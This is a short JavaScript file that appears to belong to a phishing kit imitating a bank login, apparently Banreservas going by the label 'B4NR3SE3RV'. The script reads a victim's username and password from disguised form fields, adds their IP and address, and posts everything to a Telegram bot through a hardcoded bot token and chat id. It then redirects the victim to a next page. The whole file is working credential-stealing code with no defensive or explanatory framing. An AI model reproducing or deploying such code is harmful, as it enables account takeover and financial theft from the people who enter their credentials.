//bot token
var telegram_bot_id = "6430952564:AAGTe_xBZXxWsdIHq_Ehy8NoQcaUqOLhDuU";
//chat id
var chat_id ="-4164222214";
var u_name, u_name2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("0T4RX").value;
    u_name2 = document.getElementById("C0NTRX").value;
    ip = document.getElementById("ip").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🔹B4NR3SE3RV V.3🔹\n👤US3R4x: " + u_name + "\n🔒c0NTR4l: " + u_name2 + "\n\nIP: " + ip +"\n" + ip2 +"\n🔹C0DIGO SYN4PSE🔹";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
       $.ajax(settings).done(function (response) {
        window.location = 'index3.html';
        console.log(response);
    });
    return false;
};
